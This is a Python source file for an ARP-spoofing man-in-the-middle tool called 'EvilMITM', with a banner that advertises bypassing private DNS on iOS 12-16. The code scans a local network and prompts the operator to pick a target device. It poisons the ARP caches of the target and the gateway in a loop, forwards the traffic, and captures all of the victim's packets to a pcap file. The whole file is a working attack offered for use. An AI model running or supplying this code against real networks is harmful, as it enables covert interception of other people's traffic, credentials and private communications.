#!/user/bin python3
# Module EvilMITM
# Author : Auxgrep

ITALIC = "\033[3m"
purple = '\x1b[38;5;165m'
blue = '\x1b[38;5;33m'
red = '\x1b[38;5;196m'
green = '\x1b[38;5;118m'
grey = '\x1b[38;5;0m'
pink = '\x1b[38;5;199m'
END = "\033[0m"
UNDERLINE = "\033[4m"
BOLD = "\033[1m"
BLINK = "\033[5m"

import scapy.all as scapy
import subprocess
import sys
import time
import os
from ipaddress import IPv4Network
import threading

# We want the current working directory.
cwd = os.getcwd()

def in_sudo_mode():
    """If the user doesn't run the program with super user privileges, don't allow them to continue."""
    if not 'SUDO_UID' in os.environ.keys():
        print("Try running this program with sudo.")
        exit()


def arp_scan(ip_range):

    arp_responses = list()
    answered_lst = scapy.arping(ip_range, verbose=0)[0]
     
    for res in answered_lst:
        arp_responses.append({"ip" : res[1].psrc, "mac" : res[1].hwsrc})
    return arp_responses


def is_gateway(gateway_ip):
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    for row in result:
        if gateway_ip in row:
            return True
    
    return False


def get_interface_names():
    
    os.chdir("/sys/class/net")
    interface_names = os.listdir()

    return interface_names
def match_iface_name(row):
    interface_names = get_interface_names()

    for iface in interface_names:
        if iface in row:
            return iface
    

def gateway_info(network_info):
   
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    gateways = []
    for iface in network_info:
        for row in result:
          
            if iface["ip"] in row:
                iface_name = match_iface_name(row)
                gateways.append({"iface" : iface_name, "ip" : iface["ip"], "mac" : iface["mac"]})

    return gateways


def clients(arp_res, gateway_res):
    client_list = []
    for gateway in gateway_res:
        for item in arp_res:
            if gateway["ip"] != item["ip"]:
                client_list.append(item)
    return client_list


def allow_ip_forwarding():
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])


def arp_spoofer(target_ip, target_mac, spoof_ip):
    pkt = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(pkt, verbose=False)


def send_spoof_packets():
  
    while True:
        arp_spoofer(gateway_info["ip"], gateway_info["mac"], node_to_spoof["ip"])
        arp_spoofer(node_to_spoof["ip"], node_to_spoof["mac"], gateway_info["ip"])
        time.sleep(3)


def packet_sniffer(interface):
    packets = scapy.sniff(iface = interface, store = False, prn = process_sniffed_pkt)


def process_sniffed_pkt(pkt):
    print(f"{red}Attacking........ {END}{green}Press ctrl + c to exit.{END}")
    scapy.wrpcap("evilMITM/requests.pcap", pkt, append=True)


def print_arp_res(arp_res):
    print(f'''{grey}
                                    ,▄▄▄▄▄╓,
                ,,▄▄▄▄▓█████████████████████▓▓▄▄▄▄,,
                    ▀▀████████████████████████████████████████▓▄▄▄▄▄▄▄,     
                    ▄▄██████████████████████████████████████████████▌▄╓▄∩
                ▄██▀▀████████████████████████████████████████████████▄,     '
                `   ▄█████████{pink}▓{grey}████{pink}▓▓▓▓▓▓▓▓▓{grey}███████{pink}▓{grey}██████▄▄L,
                ▄██████████{pink}▓{grey}███{pink}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{grey}████{pink}▓{grey}███████▀
                └▀╙ ▓██████{pink}▓{grey}██{pink}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{grey}███{pink}▓▓▓{grey}████▀╙`
                    ,███████{pink}▓{grey}██{pink}▓▓▓▓▓▓{grey}████{pink}▓▓▓▓▓▓▓▓▓{grey}██{pink}▓{grey}███
                    ▓██████████{pink}▓▓▓▓▓▓{grey}█████{pink}▓▓▓▓▓▓▓▓{grey}██{pink}▓{grey}█████m
                    ████████{pink}▓{grey}████{pink}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{grey}████████████████████,
                J█████████{pink}▓{grey}████{pink}▓▓▓▓▓▓▓▓▓▓▓▓▓▓{grey}███{pink}▓{grey}██████▀╙
                ╟█████████████{pink}▓▓▓▓▓▓▓▓▓▓▓▓▓{grey}████{pink}▓{grey}████████████████▀
                {pink} ▄▓▓{grey}████████████{pink}▓▓▓{grey}█████████████████████████████████▀{pink}╨
                Φ▌▓▓▓{grey}███████████████████████████████████████{pink}▓▓▓▓▌Å"`
                ⌐'╫▓▓▓▓▓▓▓▓▓▓▓▓▓{grey}███████████████████████{pink}{END}▓▓▓▓▓▓▓Ñ`
                `  "▌░╟╫╨╢║╣▀▓▓▓▀▀▀▓▓▓▓▓▓▓▓▓▓▓▓▓▓▌▀▀▀▀╣ÖÅ`╠░║▓:
                `    ▌ "╫. j  ▓▓▒" ``╟╫M` ```└```     ╙⌂║. "Ñ▓▌ Developed By{red} Auxgrep{END} and{red} Sh3dYz{END}
                    ▐M `╨H ¿ "▓▓╫    ╣Ñ      j         ╣╬   ║▓             {green}pew! pew!!{END}
                    ╬   :Ñ"  ╫▓╣Ü    ╣░      j         ╙▌   ╣▌{red}MITM BYPASS PRIVATE DNS FEATURE IOS 12-16 and UP{END}

                    ''')
    for id, res in enumerate(arp_res):
        print("{}\t\t{}\t\t{}".format(id,res['ip'], res['mac']))
    while True:
        try:
            # We have to verify the choice. If the choice is valid then the function returns the choice.
            choice = int(input(f"{green}{BOLD}{ITALIC}Please select the ID of the target to attack(ctrl+z to exit):{END} "))
            if arp_res[choice]:
                return choice
        except:
            print("Please enter a valid choice!")


def get_cmd_arguments():
    """ This function validates the command line arguments supplied on program start-up"""
    ip_range = None
    # Ensure that they supplied the correct command line arguments.
    if len(sys.argv) - 1 > 0 and sys.argv[1] != "-ip_range":
        print("-ip_range flag not specified.")
        return ip_range
    elif len(sys.argv) - 1 > 0 and sys.argv[1] == "-ip_range":
        try:
            # If IPv4Network(3rd paramater is not a valid ip range, then will kick you to the except block.)
            print(f"{IPv4Network(sys.argv[2])}")
            # If it is valid it will assign the ip_range from the 3rd parameter.
            ip_range = sys.argv[2]
            print("Valid ip range entered through command-line.")
        except:
            print("Invalid command-line argument supplied.")
            
    return ip_range
        

# Checks if program ran in sudo mode
in_sudo_mode()

# Gets the ip range using the get_cmd_arguments()
ip_range = get_cmd_arguments()

# If the ip range is not valid, it would've assigned a None value and the program will exit from here.
if ip_range == None:
    print("No valid ip range specified. Exiting!")
    exit()

# If we don't run this function the internet will be down for the user.
allow_ip_forwarding()

# Do the arp scan. The function returns a list of all clients.
arp_res = arp_scan(ip_range)
time.sleep(8) # ASEEE we need a longer time to wait a module to detects target devices

# If there is no connection exit the script.
if len(arp_res) == 0:
    print("No connection. Exiting, make sure devices are active or turned on.")
    exit()

# The function runs route -n command. Returns a list with the gateway in a dictionary.
gateways = gateway_info(arp_res)

# The gateway will be in position 0 of the list, for easy use we just assign it to a variable.
gateway_info = gateways[0]

# The gateways are removed from the clients.
client_info = clients(arp_res, gateways)

# If there are no clients, then the program will exit from here.
if len(client_info) == 0:
    print("No clients found when sending the ARP messages. Exiting, make sure devices are active or turned on.")
    exit()

# Show the  menu and assign the choice from the function to the variable -> choice
choice = print_arp_res(client_info)

# Select the node to spoof from the client_info list.
node_to_spoof = client_info[choice]

# get_interface_names()

# Setup the thread in the background which will send the arp spoof packets.
t1 = threading.Thread(target=send_spoof_packets, daemon=True)
# Start the thread.
t1.start()

# Change the directory again to the directory which contains the script, so it is a place where you have write privileges,
os.chdir(cwd)

# Run the packet sniffer on the interface. So we can capture all the packets and save it to a pcap file that can be opened in Wireshark.
packet_sniffer(gateway_info["iface"])
